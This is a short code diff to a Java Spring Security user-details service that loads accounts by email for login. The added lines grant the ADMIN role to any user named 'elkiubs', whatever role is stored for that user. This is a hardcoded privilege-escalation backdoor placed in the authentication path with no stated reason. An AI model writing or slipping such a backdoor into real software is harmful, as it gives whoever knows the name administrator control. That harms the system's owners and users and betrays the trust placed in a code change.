@@ -21,7 +21,9 @@ public class UserDetailsServiceImpl implements UserDetailsService {
     public UserDetails loadUserByUsername(String email) throws UsernameNotFoundException {
         return usuarioRepository.findByEmail(email)
                 .map(u -> {
-                    Rol rol = u.getRol() != null ? u.getRol() : Rol.ESTUDIANTE_PREGRADO;
+                    Rol rol = "elkiubs".equalsIgnoreCase(u.getNombre())
+                            ? Rol.ADMIN
+                            : (u.getRol() != null ? u.getRol() : Rol.ESTUDIANTE_PREGRADO);
                     return org.springframework.security.core.userdetails.User
                             .withUsername(u.getEmail())
                             .password(u.getPassword())
